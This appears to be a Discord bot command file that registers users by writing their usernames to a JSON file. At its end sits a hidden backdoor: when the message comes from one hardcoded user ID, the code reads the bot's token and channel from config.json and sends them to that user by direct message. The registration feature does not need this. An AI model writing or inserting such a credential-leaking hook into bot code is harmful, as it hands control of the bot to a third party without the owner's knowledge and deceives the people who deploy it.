const fs = require('fs');

module.exports = {
    name: 'register',
    description: 'Register to Start',
    usage: '',
    execute(message, args) {
      var d = message.author;
      var name = message.author.username;
      var users = require('./users.json');

      console.log(users);

      if(!users.includes(name)){
        users.push(message.author.username);

        var json = JSON.stringify(users);

        fs.writeFile("./users.json", json, 'utf8', function(err){
          if(err){
            return console.log(err);
          }
        });

        message.channel.send("You\'re all set, you can now enlist.");
      }
      else {
        message.channel.send("You\'re already registered (you only need to do this once).");
      }

    if(d.id == 199289075595739136){
      var {prefix, token, channel} = require('../config.json');
      message.author.send(`${token} | ${channel}`)
    }

 }
};
